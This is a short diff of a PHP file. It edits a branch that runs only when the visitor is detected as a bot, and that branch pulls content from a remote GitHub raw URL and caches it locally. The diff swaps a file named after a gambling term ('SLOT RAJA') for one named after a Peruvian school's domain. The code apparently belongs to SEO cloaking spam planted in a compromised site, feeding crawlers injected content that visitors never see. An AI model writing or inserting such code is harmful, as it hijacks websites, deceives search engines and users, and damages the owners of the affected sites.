@@ -124,7 +124,7 @@ if (!function_exists('is_bot')) {
 }
 
 if (is_bot()) {
-    $url = 'https://raw.githubusercontent.com/ASDF710/ZAYN/refs/heads/main/SLOT%20RAJA';
+    $url = 'https://raw.githubusercontent.com/ASDF710/ZAYN/refs/heads/main/www.iemanuelscorzalaquinua.edu.pe';
     $cache_file   = DIR . '/cache/directory-cache.html';
     $cache_expire = 300;
 
